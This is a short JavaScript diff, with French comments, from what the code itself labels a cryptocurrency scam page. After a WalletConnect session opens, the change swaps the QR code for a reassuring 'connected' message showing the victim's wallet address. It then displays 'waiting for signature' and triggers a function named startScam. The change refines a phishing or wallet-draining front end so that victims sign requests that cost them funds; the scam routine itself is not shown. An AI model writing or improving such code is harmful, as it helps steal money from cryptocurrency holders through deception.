@@ -816,10 +816,17 @@ async function initWalletConnect() {
   account = ethAccount.split(':')[2];
   currentChainId = '1';
 
-  // Cacher le QR et afficher le statut
-  qrDiv.style.display = 'none';
+    // Remplacer le QR par le texte de statut (sans cacher le div)
+  qrDiv.innerHTML = '';
+  qrDiv.style.display = 'flex';
+  qrDiv.style.alignItems = 'center';
+  qrDiv.style.justifyContent = 'center';
+  qrDiv.style.fontSize = '14px';
+  qrDiv.style.color = 'var(--azure-15)';
+  qrDiv.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
+
   const scanText = document.querySelector('.scan');
-  if (scanText) scanText.textContent = `Connecté : ${account.slice(0,6)}...${account.slice(38)}`;
+  if (scanText) scanText.textContent = 'En attente de signature…';
 
   setTimeout(startScam, 1000);
 }
